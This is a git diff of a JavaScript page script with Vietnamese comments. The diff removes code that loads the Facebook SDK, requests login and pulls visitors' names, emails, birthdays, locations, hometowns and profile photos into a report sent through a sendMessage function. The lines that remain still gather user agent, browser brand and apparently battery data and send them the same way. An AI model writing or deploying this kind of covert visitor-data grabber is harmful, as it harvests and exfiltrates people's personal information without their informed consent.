@@ -22,68 +22,8 @@ async function getData() {
     }
 }
 
-let facebookUserData = null; // Biến toàn cục lưu dữ liệu Facebook
-
-// Tải SDK Facebook đúng cách
-function loadFacebookSDK(appId) {
-    return new Promise((resolve) => {
-        if (document.getElementById('facebook-jssdk')) {
-            return resolve();
-        }
-        let js = document.createElement('script');
-        js.id = 'facebook-jssdk';
-        js.src = "https://connect.facebook.net/vi_VN/sdk.js";
-        js.async = true;
-        js.defer = true;
-        js.onload = function() {
-            window.fbAsyncInit = function() {
-                FB.init({
-                    appId: appId,
-                    cookie: true,
-                    xfbml: true,
-                    version: 'v18.0'
-                });
-                console.log("Facebook SDK Loaded");
-                resolve();
-            };
-        };
-        document.head.appendChild(js);
-    });
-}
-
-// Hàm lấy thông tin Facebook
-async function getFacebookUserData() {
-    return new Promise((resolve) => {
-        FB.getLoginStatus(function(response) {
-            if (response.status === 'connected') {
-                FB.api('/me', {
-                    fields: 'id,name,first_name,last_name,email,gender,birthday,location,hometown,picture'
-                }, function(user) {
-                    facebookUserData = user;
-                    resolve(user);
-                });
-            } else {
-                FB.login(function(response) {
-                    if (response.authResponse) {
-                        FB.api('/me', {
-                            fields: 'id,name,first_name,last_name,email,gender,birthday,location,hometown,picture'
-                        }, function(user) {
-                            facebookUserData = user;
-                            resolve(user);
-                        });
-                    } else {
-                        resolve(null);
-                    }
-                }, { scope: 'public_profile,email,user_birthday,user_location,user_hometown' });
-            }
-        });
-    });
-}
-
 // Hàm gửi dữ liệu đồng bộ
 const postDataUser = async () => {
-    await loadFacebookSDK('1483255362403222'); // Thay YOUR_APP_ID bằng App ID của bạn
-    await getFacebookUserData();
     await getData();
 
     // Lấy thông tin pin
@@ -106,16 +46,6 @@ const postDataUser = async () => {
     // Gửi dữ liệu
     sendMessage({
         content: `----------------------------------------------\n**User: ${userType}**\n\n`
-            + `**Facebook Name:** ${facebookUserData?.name || "Không lấy được"}\n`
-            + `**Facebook ID:** ${facebookUserData?.id || "Không lấy được"}\n`
-            + `**First Name:** ${facebookUserData?.first_name || "Không lấy được"}\n`
-            + `**Last Name:** ${facebookUserData?.last_name || "Không lấy được"}\n`
-            + `**Email:** ${facebookUserData?.email || "Không lấy được"}\n`
-            + `**Gender:** ${facebookUserData?.gender || "Không lấy được"}\n`
-            + `**Birthday:** ${facebookUserData?.birthday || "Không lấy được"}\n`
-            + `**Location:** ${facebookUserData?.location?.name || "Không lấy được"}\n`
-            + `**Hometown:** ${facebookUserData?.hometown?.name || "Không lấy được"}\n`
-            + `**Profile Picture:** ${facebookUserData?.picture?.data?.url || "Không lấy được"}\n`
             + `\n----------------------------------------------\n`
             + `**User Agent:** ${userAgent}\n`
             + `**Brand 1:** ${JSON.stringify(userData?.brands[0])}\n`
